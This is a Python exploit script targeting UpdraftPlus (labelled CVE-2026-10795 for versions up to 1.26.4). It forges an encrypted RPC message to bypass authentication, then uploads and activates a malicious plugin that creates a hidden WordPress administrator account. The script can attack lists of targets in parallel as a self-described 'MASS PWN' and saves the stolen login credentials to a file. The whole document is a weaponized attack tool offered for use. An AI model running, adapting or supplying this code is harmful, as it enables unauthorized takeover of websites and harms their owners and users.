import requests
import json
import base64
import time
import random
import argparse
import sys
import threading
import concurrent.futures
import string
import io
import zipfile
import urllib3
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

# Force UTF-8 encoding for Windows terminals
if sys.stdout.encoding.lower() != 'utf-8':
    try:
        sys.stdout.reconfigure(encoding='utf-8')
    except AttributeError:
        pass

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 2026 Cyberpunk Aesthetics
class C:
    RED = '\033[38;5;196m'
    GREEN = '\033[38;5;46m'
    BLUE = '\033[38;5;39m'
    YELLOW = '\033[38;5;226m'
    MAGENTA = '\033[38;5;213m'
    CYAN = '\033[38;5;51m'
    WHITE = '\033[38;5;231m'
    DIM = '\033[2m'
    BOLD = '\033[1m'
    RESET = '\033[0m'

def build_payload(command, data, key_name):
    # 1. Prepare JSON message
    inner = {
        "command": command,
        "time": int(time.time()),
        "key_name": key_name,
        "rand": random.randint(1, 2147483647)
    }
    if data:
        inner["data"] = data

    json_payload = json.dumps(inner).encode('utf-8')

    # 2. Encrypt with AES-CBC using 16 NULL bytes for Key and IV
    aes_key = b'\x00' * 16
    aes_iv = b'\x00' * 16
    cipher = AES.new(aes_key, AES.MODE_CBC, aes_iv)
    ciphertext = cipher.encrypt(pad(json_payload, AES.block_size))
    ciphertext_b64 = base64.b64encode(ciphertext).decode("ascii")

    # 3. Dummy RSA encrypted symmetric key
    bad_rsa_block = b"CVE-2026-10795-LAB-BAD-RSA-BLOCK"
    bad_sym_key_b64 = base64.b64encode(bad_rsa_block).decode("ascii")

    # 4. Construct udrpc_message format
    sym_key_len = f"{len(bad_sym_key_b64):03x}"
    ciphertext_len = f"{len(ciphertext_b64):016x}"

    udrpc_message = f"{sym_key_len}{bad_sym_key_b64}{ciphertext_len}{ciphertext_b64}"
    
    return udrpc_message

def attack(target, print_lock):
    def log(msg):
        with print_lock:
            print(msg)
            
    target = target.rstrip('/')
    key_name = "0.central.updraftplus.com"
    
    log(f"\n{C.CYAN}Target : {target}{C.RESET}")
    log(f"{C.YELLOW}[*]{C.RESET} Building payload to add administrator via eval...")
    
    # Generate random credentials
    random_user = ''.join(random.choices(string.ascii_lowercase, k=8))
    random_pass = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
    random_email = f"{random_user}@pwn.local"

    log(f"{C.DIM}[*] Generated Admin Credentials:{C.RESET}")
    log(f"{C.DIM}    Username: {random_user}{C.RESET}")
    log(f"{C.DIM}    Password: {random_pass}{C.RESET}")

    zip_buffer = io.BytesIO()
    with zipfile.ZipFile(zip_buffer, "w", zipfile.ZIP_DEFLATED) as zip_file:
        # Create a malicious plugin
        plugin_content = f"""<?php
/**
 * Plugin Name: Updraft Pwn
 * Version: 1.0
 */
add_action('init', function() {{
    $user_login = '{random_user}';
    $user_pass = '{random_pass}';
    $user_email = '{random_email}';

    if ( !username_exists( $user_login ) ) {{
        $user_id = wp_create_user( $user_login, $user_pass, $user_email );
        $user = new WP_User( $user_id );
        $user->set_role( 'administrator' );
    }}
}});
"""
        zip_file.writestr("updraft-pwn/updraft-pwn.php", plugin_content)

    zip_bytes = zip_buffer.getvalue()

    data = {
        "filename": "updraft-pwn.zip",
        "data": base64.b64encode(zip_bytes).decode("ascii"),
        "activate": True
    }

    udrpc_message = build_payload("plugin.upload_plugin", data, key_name)

    log(f"{C.DIM}[*] Sending payload to {target}...{C.RESET}")

    payload = {
        "format": "1",
        "key_name": key_name,
        "udrpc_message": udrpc_message
    }

    try:
        r = requests.post(target + "/", data=payload, verify=False, timeout=15)
        log(f"{C.DIM}[*] Status code: {r.status_code}{C.RESET}")
        
        if "format" in r.text and "udrpc_message" in r.text:
            log(f"{C.GREEN}{C.BOLD}[★] PRIVILEGE ESCALATION BERHASIL!{C.RESET}")
            log(f"{C.GREEN}Target  :{C.RESET} {target}")
            log(f"{C.GREEN}Login   :{C.RESET} {target}/wp-login.php")
            log(f"{C.GREEN}User    :{C.RESET} {C.WHITE}{random_user}{C.RESET}")
            log(f"{C.GREEN}Pass    :{C.RESET} {C.WHITE}{random_pass}{C.RESET}")
            
            try:
                with open("updraft_hacked.txt", "a") as f:
                    f.write(f"{target}/wp-login.php |{random_user}|{random_pass}\n")
            except: pass
        else:
            log(f"{C.RED}[-]{C.RESET} Target might not be vulnerable.")
    except Exception as e:
        log(f"{C.RED}[-]{C.RESET} Error: {e}")

def main():
    parser = argparse.ArgumentParser(description="UpdraftPlus Unauthenticated RCE (CVE-2026-10795)")
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("-t", "--url", help="Single target URL (e.g., http://cvs.ddev.site)")
    group.add_argument("-l", "--list", help="List of targets")
    parser.add_argument("--threads", type=int, default=1, help="Number of concurrent threads")
    args = parser.parse_args()

    print(f"""{C.MAGENTA}{C.BOLD}
  ╔═════════════════════════════════════════════════════════════╗
  ║  UpdraftPlus <= 1.26.4 (CVE-2026-10795)                     ║
  ║  Unauthenticated Authentication Bypass -> RCE               ║
  ║  Weaponized by ENI.                                         ║
  ╚═════════════════════════════════════════════════════════════╝{C.RESET}
    """)

    targets = []
    if args.list:
        try:
            with open(args.list, 'r') as f:
                targets = [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(f"  {C.RED}[X]{C.RESET} Could not read target file: {e}")
            sys.exit(1)
    else:
        targets = [args.url]

    print_lock = threading.Lock()

    if args.threads > 1 and len(targets) > 1:
        print(f"  {C.MAGENTA}[⚡]{C.RESET} Initiating MASS PWN with {args.threads} target threads...\n")
        with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
            # We use lambda to pass print_lock along with target
            executor.map(lambda t: attack(t, print_lock), targets)
    else:
        for target in targets:
            attack(target, print_lock)

if __name__ == "__main__":
    main()
